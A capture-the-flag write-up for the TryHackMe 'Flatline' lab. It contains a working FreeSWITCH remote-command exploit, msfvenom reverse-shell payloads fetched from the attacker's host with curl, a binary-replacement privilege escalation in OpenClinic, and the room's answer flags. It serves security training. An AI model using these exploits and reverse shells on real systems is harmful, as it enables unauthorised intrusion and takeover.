## **Flatline**

Starting off with port enumeration,
```
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-26T16:01:06+00:00
|_ssl-date: 2022-02-26T16:01:07+00:00; -4m00s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

3389 was RDP port and 8021 has freeeswitch running on it.

Simple "freeswitch exploit" google search reveals RCE exploit,
```
# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
# Date: 2019-12-19
# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
#
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
#
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
#
# nt authority\system
# 

#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 3:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target> <cmd>')
    sys.exit(1)

ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='ClueCon' # default password for FreeSWITCH

s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)
```

Running exploit,
```
python3 freeswitch-exploit.py 10.10.9.49 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

other simple commands work, so lets try uploading a shell with msfvenom,
```
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o newrev.exe
```
Uploading into box with RCE exploit,
```
python3 -m http.server 8000

python3 freeswitch-exploit.py 10.10.9.49 "curl http://<LHOST>:8000/newrev.exe -o /newrev.exe"

python3 freeswitch-exploit.py 10.10.9.49 dir    # shows our executable has been uploaded 

python3 freeswitch-exploit.py 10.10.9.49 newrev.exe        # Run this after starting nc listener
```

on local machine,
```
nc -lnvp 4444

# we get a windows shell
# Browsing to C:\Users\Nekrotic\Desktop, we find user.txt and root.txt

THM{64bca0843d535fa73eecdc59d27cbe26}       # user.txt

# root.txt needs priv esc
```

Privilege Escalation,
```
# Browsing to  C:/ shows a interesting "projects" folder, has /openclinic
```
Quick "openclinic priv esc exploit" google shows https://www.exploit-db.com/exploits/50448
```
1. Generate malicious .exe on attacking machine
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4242 -f exe > /var/www/html/mysqld_evil.exe

2. Setup listener and ensure apache is running on attacking machine
    nc -lvp 4242
    service apache2 start

3. Download malicious .exe on victim machine
    type on cmd: curl http://192.168.1.102/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"

4. Overwrite file and copy malicious .exe.
    Renename C:\projects\openclinic\mariadb\bin\mysqld.exe > mysqld.bak
    Rename downloaded 'mysqld_evil.exe' file in mysqld.exe

5. Restart victim machine

6. Reverse Shell on attacking machine opens
    C:\Windows\system32>whoami
    whoami
    nt authority\system
```
```
<AM>> msfvenom -p windows/shell_reverse_tcp LHOST=<> LPORT=<> -f exe -o mysqld_evil.exe

# Change dir to C:\projects\openclinic\mariadb\bin

# transfer that mysqld_evil.exe here with curl in rev shell
<V>> curl <URL>:<PORT>/mysqld_evil.exe -o mysqld_evil.exe

# Rename mysqld.exe to mysqld.bak
<V>> ren C:/projects/openclinic/mariadb/bin/mysqld.exe mysqld.bak
<V>> ren C:/projects/openclinic/mariadb/bin/mysqld_evil.exe mysqld.exe

# Restart victim
<V>> shutdown /r

# Rev shell on AM
<AM>> nc -lnvp <port>

# after sometime we are greeted with rev shell as admin,

connect to [10.17.29.22] from (UNKNOWN) [10.10.92.116] 49670
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

nt authority\system

<V>> more root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```


Root flag after successful exploitation,
```
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```